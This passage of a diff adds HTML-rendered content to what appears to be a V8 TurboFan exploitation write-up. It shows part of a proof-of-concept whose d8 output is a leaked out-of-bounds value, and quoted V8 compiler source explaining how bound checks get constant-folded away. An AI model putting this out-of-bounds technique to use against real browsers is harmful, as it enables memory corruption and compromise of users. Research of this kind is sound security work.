+&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;DisassembleFunction&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;opt_me&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// prints nothing on release builds&lt;/span&gt;
+&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mh"&gt;0x10000&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+  &lt;span class="nx"&gt;res&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;opt_me&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;DisassembleFunction&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;opt_me&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// prints nothing on release builds&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Checkout the result : &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ d8 poc.js
+1.5577100569205e-310
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;It worked despite those aborting bound checks. Why?
+The line &lt;code&gt;leak = arr[bad]&lt;/code&gt; didn’t lead to any CheckBounds elimination and yet we didn't execute any Unreachable node (aka breakpoint instruction).&lt;/p&gt;
+&lt;h3 id="native-context-specialization-of-an-element-access"&gt;Native context specialization of an element access&lt;/h3&gt;
+&lt;p&gt;The answer lies in the native context specialization. This is one of the early optimization phase where the compiler is given the opportunity to &lt;a href="https://www.amazon.com/Engineering-Compiler-Keith-Cooper/dp/012088478X"&gt;specialize code in a way that capitalizes on its knowledge of the context&lt;/a&gt; in which the code will execute.&lt;/p&gt;
+&lt;p&gt;One of the first optimization phase is the inlining phase, that includes native context specialization. For element accesses, the context specialization is done in &lt;code&gt;JSNativeContextSpecialization::BuildElementAccess&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;There is one case that looks very interesting when the load_mode is &lt;code&gt;LOAD_IGNORE_OUT_OF_BOUNDS&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;load_mode&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;LOAD_IGNORE_OUT_OF_BOUNDS&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+               &lt;span class="n"&gt;CanTreatHoleAsUndefined&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;receiver_maps&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+      &lt;span class="c1"&gt;// Check that the {index} is a valid array index, we do the actual&lt;/span&gt;
+      &lt;span class="c1"&gt;// bounds check below and just skip the store below if it&amp;#39;s out of&lt;/span&gt;
+      &lt;span class="c1"&gt;// bounds for the {receiver}.&lt;/span&gt;
+      &lt;span class="n"&gt;index&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;effect&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;graph&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;NewNode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+          &lt;span class="n"&gt;simplified&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;CheckBounds&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;VectorSlotPair&lt;/span&gt;&lt;span class="p"&gt;()),&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+          &lt;span class="n"&gt;jsgraph&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;Constant&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Smi&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;kMaxValue&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;effect&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;control&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;In this case, the CheckBounds node checks the index against a length of &lt;code&gt;Smi::kMaxValue&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;The actual bound checking nodes are added as follows: &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;load_mode&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;LOAD_IGNORE_OUT_OF_BOUNDS&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+          &lt;span class="n"&gt;CanTreatHoleAsUndefined&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;receiver_maps&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="n"&gt;Node&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;check&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
+            &lt;span class="n"&gt;graph&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;NewNode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;simplified&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;NumberLessThan&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;       &lt;span class="c1"&gt;// [1]&lt;/span&gt;
+        &lt;span class="n"&gt;Node&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;branch&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;graph&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;NewNode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+            &lt;span class="n"&gt;common&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;Branch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;BranchHint&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;kTrue&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+                             &lt;span class="n"&gt;IsSafetyCheck&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;kCriticalSafetyCheck&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
+            &lt;span class="n"&gt;check&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;control&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+        &lt;span class="n"&gt;Node&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;if_true&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;graph&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;NewNode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;common&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;IfTrue&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;branch&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;              &lt;span class="c1"&gt;// [2]&lt;/span&gt;
+        &lt;span class="n"&gt;Node&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;etrue&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;effect&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="n"&gt;Node&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;vtrue&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="p"&gt;{&lt;/span&gt;
+          &lt;span class="c1"&gt;// Perform the actual load&lt;/span&gt;
+          &lt;span class="n"&gt;vtrue&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;etrue&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
+              &lt;span class="n"&gt;graph&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;NewNode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;simplified&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;LoadElement&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;element_access&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;          &lt;span class="c1"&gt;// [3]&lt;/span&gt;
+                               &lt;span class="n"&gt;elements&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;etrue&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;if_true&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+        &lt;span class="c1"&gt;// [...]&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt;
+
+      &lt;span class="c1"&gt;// [...]&lt;/span&gt;
+      &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;In a nutshell, with this mode : &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;CheckBounds checks the index against Smi::kMaxValue (0x7FFFFFFF),&lt;/li&gt;
+&lt;li&gt;A NumberLessThan node is generated,&lt;/li&gt;
+&lt;li&gt;An IfTrue node is generated,&lt;/li&gt;
+&lt;li&gt;In the "true" branch, there will be a LoadElement node.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The length used by the NumberLessThan node comes from a previously generated LoadField: &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="n"&gt;Node&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;effect&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
+        &lt;span class="n"&gt;receiver_is_jsarray&lt;/span&gt;
+            &lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="n"&gt;graph&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;NewNode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+                  &lt;span class="n"&gt;simplified&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;LoadField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+                      &lt;span class="n"&gt;AccessBuilder&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;ForJSArrayLength&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;elements_kind&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt;
+                  &lt;span class="n"&gt;receiver&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;effect&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;control&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+            &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;graph&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;NewNode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+                  &lt;span class="n"&gt;simplified&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;LoadField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;AccessBuilder&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;ForFixedArrayLength&lt;/span&gt;&lt;span class="p"&gt;()),&lt;/span&gt;
+                  &lt;span class="n"&gt;elements&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;effect&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;control&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;All of this means that TurboFan does generate some bound checking nodes but there won't be any aborting bound check because of the kMaxValue length being used (well technically there is, but the maximum length is unlikely to be reached!).&lt;/p&gt;
+&lt;h3 id="type-narrowing-and-constant-folding-of-numberlessthan"&gt;Type narrowing and constant folding of NumberLessThan&lt;/h3&gt;
+&lt;p&gt;After the typer phase, the sea of nodes contains a NumberLessThan that compares a badly typed value to the correct array length. This is interesting because the TyperNarrowingReducer is going to change the type [2] with &lt;code&gt;op_typer_.singleton_true()&lt;/code&gt; [1].&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="n"&gt;IrOpcode&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="nl"&gt;kNumberLessThan&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+      &lt;span class="c1"&gt;// TODO(turbofan) Reuse the logic from typer.cc (by integrating relational&lt;/span&gt;
+      &lt;span class="c1"&gt;// comparisons with the operation typer).&lt;/span&gt;
+      &lt;span class="n"&gt;Type&lt;/span&gt; &lt;span class="n"&gt;left_type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;NodeProperties&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;GetType&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;InputAt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+      &lt;span class="n"&gt;Type&lt;/span&gt; &lt;span class="n"&gt;right_type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;NodeProperties&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;GetType&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;InputAt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;left_type&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Is&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Type&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;PlainNumber&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+          &lt;span class="n"&gt;right_type&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Is&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Type&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;PlainNumber&lt;/span&gt;&lt;span class="p"&gt;()))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;left_type&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Max&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;right_type&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Min&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+          &lt;span class="n"&gt;new_type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;op_typer_&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;singleton_true&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;              &lt;span class="c1"&gt;// [1]&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;left_type&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Min&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="n"&gt;right_type&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Max&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+          &lt;span class="n"&gt;new_type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;op_typer_&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;singleton_false&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt;
+      &lt;span class="p"&gt;}&lt;/span&gt;   
+      &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;   
+  &lt;span class="c1"&gt;// [...]&lt;/span&gt;
+  &lt;span class="n"&gt;Type&lt;/span&gt; &lt;span class="n"&gt;original_type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;NodeProperties&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;GetType&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="n"&gt;Type&lt;/span&gt; &lt;span class="k"&gt;restricted&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Type&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;Intersect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;new_type&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;original_type&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;zone&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
+  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="n"&gt;original_type&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Is&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;restricted&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;NodeProperties&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;SetType&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;restricted&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;                 &lt;span class="c1"&gt;// [2]&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nf"&gt;Changed&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="p"&gt;}&lt;/span&gt; 
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Thanks to that, the ConstantFoldingReducer will then simply remove the NumberLessThan node and replace it by a HeapConstant node.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Reduction&lt;/span&gt; &lt;span class="n"&gt;ConstantFoldingReducer&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;Reduce&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Node&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+  &lt;span class="n"&gt;DisallowHeapAccess&lt;/span&gt; &lt;span class="n"&gt;no_heap_access&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="c1"&gt;// Check if the output type is a singleton.  In that case we already know the&lt;/span&gt;
+  &lt;span class="c1"&gt;// result value and can simply replace the node if it&amp;#39;s eliminable.&lt;/span&gt;
+  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="n"&gt;NodeProperties&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;IsConstant&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;NodeProperties&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;IsTyped&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+      &lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;op&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;HasProperty&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Operator&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;kEliminatable&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="c1"&gt;// TODO(v8:5303): We must not eliminate FinishRegion here. This special&lt;/span&gt;
+    &lt;span class="c1"&gt;// case can be removed once we have separate operators for value and&lt;/span&gt;
+    &lt;span class="c1"&gt;// effect regions.&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;opcode&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;IrOpcode&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;kFinishRegion&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;NoChange&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+    &lt;span class="c1"&gt;// We can only constant-fold nodes here, that are known to not cause any&lt;/span&gt;
+    &lt;span class="c1"&gt;// side-effect, may it be a JavaScript observable side-effect or a possible&lt;/span&gt;
+    &lt;span class="c1"&gt;// eager deoptimization exit (i.e. {node} has an operator that doesn&amp;#39;t have&lt;/span&gt;
+    &lt;span class="c1"&gt;// the Operator::kNoDeopt property).&lt;/span&gt;
+    &lt;span class="n"&gt;Type&lt;/span&gt; &lt;span class="n"&gt;upper&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;NodeProperties&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;GetType&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="n"&gt;upper&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IsNone&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+      &lt;span class="n"&gt;Node&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;replacement&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;nullptr&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;upper&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IsHeapConstant&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
